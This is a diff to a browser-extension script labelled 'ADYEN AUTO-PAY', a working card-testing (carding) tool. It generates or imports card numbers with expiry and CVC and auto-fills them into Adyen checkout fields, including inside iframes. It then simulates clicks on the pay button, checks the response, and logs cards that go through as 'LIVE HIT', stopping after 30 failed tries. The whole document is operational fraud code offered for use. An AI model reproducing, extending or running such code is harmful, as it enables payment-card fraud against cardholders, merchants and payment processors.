@@ -6,8 +6,10 @@
   const isTop = window.self === window.top;
   let running = false;
   let stopRequested = false;
-  let hitCount = 0;
+  let tries = 0;
+  let liveHits = 0;
   let currentTick = "";
+  let pendingCard = null;
 
   function getConfig() {
     return new Promise((resolve) => {
@@ -37,16 +39,12 @@
     el.dispatchEvent(new Event("blur", { bubbles: true }));
   }
 
-  function attrsOf(el) {
-    return ((el.id || "") + " " + (el.name || "") + " " +
+  function classifyField(el) {
+    const s = ((el.id || "") + " " + (el.name || "") + " " +
       (el.getAttribute("aria-label") || "") + " " +
       (el.getAttribute("data-fieldtype") || "") + " " +
       (el.getAttribute("autocomplete") || "") + " " +
-      (el.className || "")).toLowerCase();
-  }
-
-  function classifyField(el) {
-    const s = attrsOf(el);
+      (typeof el.className === "string" ? el.className : "")).toLowerCase();
     if (/(card\s*[-_ ]*number|ccnum|cc[-_ ]number|\bpan\b|encrypted\w*(number|pan))/.test(s)) return "number";
     if (/(expiry|expiration)[-_ ]*(month)?|encrypted\w*month|expmonth/.test(s) && !/year/.test(s)) return "month";
     if (/(expiry|expiration)[-_ ]*year|encrypted\w*year|expyear/.test(s) || (/exp/.test(s) && /year/.test(s))) return "year";
@@ -54,27 +52,23 @@
     return null;
   }
 
-  function visibleInputs() {
-    return Array.from(document.querySelectorAll("input")).filter(
-      (i) => i.type !== "hidden" && (i.offsetParent !== null || i.type === "tel" || i.type === "text")
-    );
-  }
-
   function fillOwned(card) {
     const fields = { number: false, month: false, year: false, cvc: false };
     let any = false;
 
-    for (const inp of visibleInputs()) {
+    const inputs = Array.from(document.querySelectorAll("input"));
+    for (const inp of inputs) {
+      if (inp.type === "hidden") continue;
       const kind = classifyField(inp);
       if (!kind) continue;
       if (kind === "number" && !fields.number) {
-        setNativeValue(inp, card.number);
+        setNativeValue(inp, card.number || "");
         fields.number = true; any = true;
       } else if (kind === "month" && !fields.month) {
-        setNativeValue(inp, (card.month || card.expiryMonth || "12").toString().padStart(2, "0"));
+        setNativeValue(inp, String(card.month || card.expiryMonth || "12").padStart(2, "0"));
         fields.month = true; any = true;
       } else if (kind === "year" && !fields.year) {
-        setNativeValue(inp, (card.year || card.expiryYear || "2029").toString().slice(-2));
+        setNativeValue(inp, String(card.year || card.expiryYear || "2029").slice(-2));
         fields.year = true; any = true;
       } else if (kind === "cvc" && !fields.cvc) {
         setNativeValue(inp, card.cvc || "");
@@ -82,36 +76,29 @@
       }
     }
 
+    if (!fields.number) {
+      const n = document.querySelector('input[autocomplete="cc-number"], input[name*="cardNumber"], input[id*="cardNumber"]');
+      if (n) { setNativeValue(n, card.number || ""); fields.number = true; any = true; }
+    }
     if (!fields.month && !fields.year) {
-      const expSel = document.querySelector('input[autocomplete="cc-exp"], input[name*="expiry"], input[id*="expiry"]');
-      if (expSel) {
-        setNativeValue(expSel,
-          (card.month || card.expiryMonth).padStart(2, "0") + "/" +
-          (card.year || card.expiryYear).slice(-2));
+      const e = document.querySelector('input[autocomplete="cc-exp"], input[name*="expiry"], input[id*="expiry"]');
+      if (e) {
+        setNativeValue(e, String(card.month || card.expiryMonth || "12").padStart(2, "0") + "/" +
+          String(card.year || card.expiryYear || "2029").slice(-2));
         fields.month = true; fields.year = true; any = true;
       }
     }
-
-    if (!fields.number) {
-      const numEl = document.querySelector('input[autocomplete="cc-number"], input[name*="cardNumber"], input[id*="cardNumber"]');
-      if (numEl) {
-        setNativeValue(numEl, card.number);
-        fields.number = true; any = true;
-      }
-    }
-
     if (!fields.cvc) {
-      const cvcEl = document.querySelector('input[autocomplete="cc-csc"], input[name*="securityCode"], input[name*="cvc"]');
-      if (cvcEl) {
-        setNativeValue(cvcEl, card.cvc);
-        fields.cvc = true; any = true;
-      }
+      const c = document.querySelector('input[autocomplete="cc-csc"], input[name*="securityCode"], input[name*="cvc"]');
+      if (c) { setNativeValue(c, card.cvc || ""); fields.cvc = true; any = true; }
     }
 
-    const holder = document.querySelector(
-      'input[name*="holder"], input[id*="holder"], input[autocomplete="cc-name"]'
-    );
+    const holder = document.querySelector('input[name*="holder"], input[id*="holder"], input[autocomplete="cc-name"]');
     if (holder) setNativeValue(holder, card.holder || "JOHN DOE");
+
+    const email = document.querySelector('input[type="email"], input[name*="email"], input[id*="email"]');
+    const maybeEmail = card.holder && /@/.test(card.holder) ? card.holder : (card.email || "");
+    if (email && maybeEmail) setNativeValue(email, maybeEmail);
 
     return { fields, any };
   }
@@ -175,13 +162,30 @@
     return summarize(pref);
   }
 
+  function execFill(card) {
+    return new Promise((resolve) => {
+      try {
+        chrome.runtime.sendMessage({ action: "FF_EXEC", card: card }, (res) => {
+          if (chrome.runtime.lastError || !res) {
+            resolve({ any: false, fields: {}, error: chrome.runtime.lastError && chrome.runtime.lastError.message });
+            return;
+          }
+          resolve(res);
+        });
+      } catch (e) {
+        resolve({ any: false, fields: {}, error: String(e) });
+      }
+    });
+  }
+
   chrome.storage.onChanged.addListener((changes, area) => {
     if (area !== "local") return;
 
     const ff = changes["nono_ff"];
     if (ff && ff.newValue && ff.newValue.card) {
       currentTick = ff.newValue.tick;
-      const r = fillOwned(ff.newValue.card);
+      pendingCard = ff.newValue.card;
+      const r = fillOwned(pendingCard);
       report("nono_ff", { tick: ff.newValue.tick, fields: r.fields, any: r.any });
       return;
     }
@@ -197,10 +201,8 @@
     const dbg = changes["nono_dbg"];
     if (dbg && dbg.newValue) {
       currentTick = dbg.newValue.tick;
-      const inputs = visibleInputs().map((i) => ({
-        t: i.type,
-        n: i.name || "",
-        id: i.id || "",
+      const inputs = Array.from(document.querySelectorAll("input")).map((i) => ({
+        t: i.type, n: i.name || "", id: i.id || "",
         al: i.getAttribute("aria-label") || "",
         ac: i.getAttribute("autocomplete") || "",
         ft: i.getAttribute("data-fieldtype") || "",
@@ -212,6 +214,15 @@
     }
   });
 
+  const observer = new MutationObserver(() => {
+    if (!pendingCard) return;
+    const r = fillOwned(pendingCard);
+    report("nono_ff", { tick: currentTick, fields: r.fields, any: r.any });
+  });
+  observer.observe(document.documentElement || document, {
+    childList: true, subtree: true
+  });
+
   function ensureCardMethod() {
     const methods = Array.from(document.querySelectorAll(
       '.adyen-checkout__payment-method, [data-testid*="payment-method"], [class*="payment-method"]'
@@ -219,12 +230,8 @@
     for (const m of methods) {
       const txt = (m.innerText || "").toLowerCase();
       if (/card|credit|debit/.test(txt)) {
-        const open = m.querySelector(".adyen-checkout__payment-method__details") &&
-          m.querySelector(".adyen-checkout__payment-method__details").offsetWidth > 0;
-        if (!open) {
-          m.click();
-          return true;
-        }
+        m.click();
+        return true;
       }
     }
     const btns = Array.from(document.querySelectorAll("button, label, div[role='button']"));
@@ -245,21 +252,34 @@
       if (rect.width === 0 && rect.height === 0) continue;
       const text = ((b.innerText || "") + " " + (b.getAttribute("aria-label") || "")).trim().toLowerCase();
       if (/^(pay|pay now|pay \$?\d|proceed to pay|confirm|submit|place order)/i.test(text) ||
-        /adyen-checkout__button/.test(b.className || "")) {
+        (/adyen-checkout__button/.test(b.className || "") && /pay|continue/i.test(text))) {
         return b;
       }
     }
     return null;
   }
 
-  function submitClick(tries = 0) {
+  function submitClick(triesLeft) {
+    triesLeft = triesLeft == null ? 8 : triesLeft;
     const btn = findPayButton();
     if (btn) {
-      btn.click();
+      const rect = btn.getBoundingClientRect();
+      btn.scrollIntoView({ block: "center" });
+      const x = rect.left + rect.width / 2;
+      const y = rect.top + rect.height / 2;
+      const opts = { bubbles: true, cancelable: true, view: window };
+      btn.dispatchEvent(new MouseEvent("mousedown", opts));
+      btn.dispatchEvent(new MouseEvent("mouseup", opts));
+      btn.dispatchEvent(new MouseEvent("click", opts));
+      for (const ev of ["pointerdown", "pointerup"]) {
+        try {
+          btn.dispatchEvent(new PointerEvent(ev, { bubbles: true, cancelable: true, pointerId: 1, pointerType: "touch" }));
+        } catch (e) {}
+      }
       return true;
     }
-    if (tries < 6) {
-      return new Promise((r) => setTimeout(() => r(submitClick(tries + 1)), 900));
+    if (triesLeft > 0) {
+      return new Promise((r) => setTimeout(() => r(submitClick(triesLeft - 1)), 1000));
     }
     return false;
   }
@@ -321,7 +341,7 @@
         <div style="display:flex;align-items:center;gap:8px">
           <span style="font-size:16px">&#9889;</span>
           <b style="font-size:13px;letter-spacing:.5px">ADYEN AUTO-PAY</b>
-          <span id="nono-ver" style="font-size:9px;background:#00110d33;color:#00110d;padding:2px 6px;border-radius:8px">1.3</span>
+          <span id="nono-ver" style="font-size:9px;background:#00110d33;color:#00110d;padding:2px 6px;border-radius:8px">1.4</span>
         </div>
         <div style="display:flex;gap:6px">
           <button id="nono-dbg" title="Debug DOM" style="background:#00110d22;border:none;color:#00110d;cursor:pointer;width:22px;height:22px;border-radius:6px;font-size:10px;line-height:1;font-weight:700">DBG</button>
@@ -352,7 +372,10 @@
             <input id="nono-combo" type="text" placeholder="number|mm|yyyy|cvc" inputmode="numeric"
               style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:13px;outline:none">
           </div>
-          <button id="nono-clear" title="Clear combo" style="background:#23303c;border:none;color:#fff;cursor:pointer;padding:8px 10px;border-radius:8px;font-size:12px">&#10005;</button>
+          <div style="width:88px">
+            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Holder</label>
+            <input id="nono-holder" type="text" placeholder="JOHN DOE" style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:12px;outline:none">
+          </div>
         </div>
 
         <div style="display:flex;gap:6px;align-items:center;font-size:11px;margin-top:2px">
@@ -371,7 +394,7 @@
 
         <div style="display:flex;justify-content:space-between;font-size:11px;margin-top:2px">
           <span style="color:#00d1b2" id="nono-log">Ready, Chief.</span>
-          <span style="color:#ffcc00" id="nono-count">Hits: 0</span>
+          <span style="color:#ffcc00" id="nono-count">Live: 0</span>
         </div>
 
         <div id="nono-results" style="max-height:150px;overflow-y:auto;font-size:11px;border-top:1px solid #1a2430;padding-top:6px"></div>
@@ -453,6 +476,7 @@
       const cfg = {
         bin: el("#nono-bin").value.trim(),
         combo: el("#nono-combo").value.trim(),
+        holder: el("#nono-holder").value.trim(),
         cardLength: parseInt(el("#nono-len").value, 10) || 16,
         autoSubmit: el("#nono-autosubmit").checked,
         autoOnLoad: el("#nono-autoonload").checked,
@@ -464,13 +488,12 @@
 
     function logMsg(m) { log.textContent = m; }
     function updateCount() {
-      count.textContent = "Hits: " + hitCount;
-      pillCount.textContent = String(hitCount);
+      count.textContent = "Live: " + liveHits + " / " + tries;
+      pillCount.textContent = String(liveHits);
     }
     function logResult(icon, text, color, mono) {
       const line = document.createElement("div");
-      line.style.cssText = "padding:3px 0;border-bottom:1px solid #141c26;color:" + color + ";white-space:nowrap;overflow:hidden;text-overflow:ellipsis;display:flex;gap:4px;align-items:center";
-      if (mono) line.style.color = "#e6e6e6";
+      line.style.cssText = "padding:3px 0;border-bottom:1px solid #141c26;color:" + (mono ? "#e6e6e6" : color) + ";white-space:nowrap;overflow:hidden;text-overflow:ellipsis;display:flex;gap:4px;align-items:center";
       line.innerHTML = '<span style="flex-shrink:0">' + icon + '</span><span style="overflow:hidden;text-overflow:ellipsis">' + text + '</span>';
       box.prepend(line);
       while (box.children.length > 12) box.lastChild.remove();
@@ -486,14 +509,11 @@
       const s = await summarize("nono_dbg");
 
       const iframes = Array.from(document.querySelectorAll("iframe")).map((f) => ({
-        src: (f.src || "").slice(0, 130),
-        title: f.title || "",
-        h: f.offsetHeight,
-        w: f.offsetWidth
+        src: (f.src || "").slice(0, 130), title: f.title || "", w: f.offsetWidth, h: f.offsetHeight
       }));
-      const top = JSON.stringify({ url: location.href, iframes: iframes, inputs: visibleInputs().length });
-      let out = top;
-      s.texts.forEach((t, i) => { out += "\n---FRAME " + (i + 1) + "--- " + t; });
+      let out = "URL:" + location.href + " | iframes:" + iframes.length + " " + JSON.stringify(iframes) +
+        " | inputs:" + document.querySelectorAll("input").length;
+      s.texts.forEach((t, i) => { out += "\n---FRAME " + (i + 1) + "---" + t; });
       if (!s.texts.length) out += "\n(no frame handlers answered)";
 
       const line = document.createElement("div");
@@ -509,12 +529,9 @@
       panel.style.opacity = "0";
       setTimeout(() => panel.remove(), 200);
     });
-    el("#nono-clear").addEventListener("click", () => {
-      el("#nono-combo").value = "";
-      savePanelState();
-    });
     el("#nono-bin").addEventListener("input", savePanelState);
     el("#nono-combo").addEventListener("input", savePanelState);
+    el("#nono-holder").addEventListener("input", savePanelState);
     el("#nono-len").addEventListener("change", savePanelState);
     el("#nono-autosubmit").addEventListener("change", savePanelState);
     el("#nono-autoonload").addEventListener("change", savePanelState);
@@ -534,7 +551,8 @@
       }
       savePanelState();
       stopRequested = false;
-      hitCount = 0;
+      tries = 0;
+      liveHits = 0;
       updateCount();
       box.innerHTML = "";
       logMsg("Hitting...");
@@ -552,10 +570,25 @@
     return { number: (parts[0] || "").replace(/\s/g, ""), month: parts[1] || "", year: parts[2] || "", cvc: parts[3] || "" };
   }
 
+  async function fillRound(card) {
+    let got = { any: false, fields: {} };
+    try {
+      const res = await execFill(card);
+      if (res && !res.error && res.any) got = { any: true, fields: res.fields || {} };
+    } catch (e) {}
+    const tick = Date.now() + Math.floor(Math.random() * 1000);
+    currentTick = tick;
+    clearReports("nono_ff");
+    chrome.storage.local.set({ nono_ff: { card: card, tick: tick } });
+    const st = await waitReports("nono_ff", 1500, 6000);
+    return { exec: got, storage: st, any: got.any || st.any };
+  }
+
   async function runHits() {
     const cfg = await getConfig();
     if (!cfg) return;
     running = true;
+    window.__nonoLog && window.__nonoLog("Running...");
 
     while (!stopRequested && running) {
       let card;
@@ -568,29 +601,33 @@
         card.month = card.expiryMonth;
         card.year = card.expiryYear;
       }
+      pendingCard = card;
 
-      ensureCardMethod();
-      await sleep(600);
+      tries++;
+      window.__nonoUpdate && window.__nonoUpdate();
+      window.__nonoLog && window.__nonoLog("Try #" + tries + " -> " + card.number);
 
-      const tick = Date.now() + Math.floor(Math.random() * 1000);
-      currentTick = tick;
-      clearReports("nono_ff");
-      chrome.storage.local.set({ nono_ff: { card: card, tick: tick } });
-      window.__nonoLog && window.__nonoLog("Hit #" + (hitCount + 1) + " -> " + card.number);
-
-      const st = await waitReports("nono_ff", 1800, 9000);
+      let st = { any: false };
+      for (let round = 0; round < 3 && !stopRequested; round++) {
+        ensureCardMethod();
+        await sleep(500);
+        st = await fillRound(card);
+        if (st.any) break;
+        window.__nonoLog && window.__nonoLog("No fields yet, round " + (round + 1) + "/3...");
+        await sleep(2200);
+      }
 
       let submitted = false;
       if (cfg.autoSubmit && st.any) {
         submitted = !!submitClick();
-        if (!submitted) window.__nonoLog && window.__nonoLog("No pay button yet, retrying submit...");
+        if (!submitted) window.__nonoLog && window.__nonoLog("Submitting retry...");
       }
 
       const dtTick = Date.now() + Math.floor(Math.random() * 1000);
       currentTick = dtTick;
       clearReports("nono_dt");
       chrome.storage.local.set({ nono_detect: { tick: dtTick } });
-      const dt = await waitReports("nono_dt", 1000, 4500);
+      const dt = await waitReports("nono_dt", 1200, 5000);
 
       let res = detectResult(dt.texts);
       if (!res) {
@@ -599,19 +636,27 @@
         else res = { ok: false, label: "NO VISIBLE RESULT" };
       }
 
-      hitCount++;
       window.__nonoUpdate && window.__nonoUpdate();
-      const icon = res.ok ? "&#9989;" : "&#10060;";
-      const color = res.ok ? "#00d1b2" : "#ff5d5d";
-      window.__nonoResult && window.__nonoResult(icon,
-        "N" + hitCount + " " + card.number + " " + card.month + "/" + card.year.slice(-2) + " " + card.cvc + " -> " + res.label, color);
 
-      if (res.ok && (res.label === "PROCESSED" || res.label === "3DS CHALLENGE")) {
-        window.__nonoLog && window.__nonoLog("It moved Chief: " + res.label + ". Stopping.");
+      if (res.ok) {
+        liveHits++;
+        window.__nonoUpdate && window.__nonoUpdate();
+        window.__nonoResult && window.__nonoResult("&#11088;",
+          "LIVE #" + liveHits + "  " + card.number + " " + card.month + "/" + card.year.slice(-2) +
+          " " + card.cvc + " -> " + res.label, "#00d1b2");
+        window.__nonoLog && window.__nonoLog("LIVE HIT! " + res.label + ". Stopping.");
         stopRequested = true;
+      } else {
+        window.__nonoResult && window.__nonoResult("&#10060;",
+          "try#" + tries + " " + card.number + " " + card.month + "/" + card.year.slice(-2) +
+          " " + card.cvc + " -> " + res.label, "#ff5d5d");
+        if (tries >= 30) {
+          window.__nonoLog && window.__nonoLog("30 dead tries. Stopping.");
+          stopRequested = true;
+        }
       }
 
-      await sleep(1200);
+      await sleep(cfg.autoSubmit ? 2000 : 800);
     }
 
     running = false;
@@ -623,8 +668,8 @@
     buildPanel();
     const cfg = await getConfig();
     if (cfg) {
-      const ids = ["nono-bin", "nono-combo", "nono-len", "nono-autosubmit", "nono-autoonload"];
-      const vals = [cfg.bin || "", cfg.combo || "", String(cfg.cardLength || 16), !!cfg.autoSubmit, !!cfg.autoOnLoad];
+      const ids = ["nono-bin", "nono-combo", "nono-holder", "nono-len", "nono-autosubmit", "nono-autoonload"];
+      const vals = [cfg.bin || "", cfg.combo || "", cfg.holder || "", String(cfg.cardLength || 16), !!cfg.autoSubmit, !!cfg.autoOnLoad];
       ids.forEach((id, i) => {
         const e = document.getElementById(id);
         if (e) {
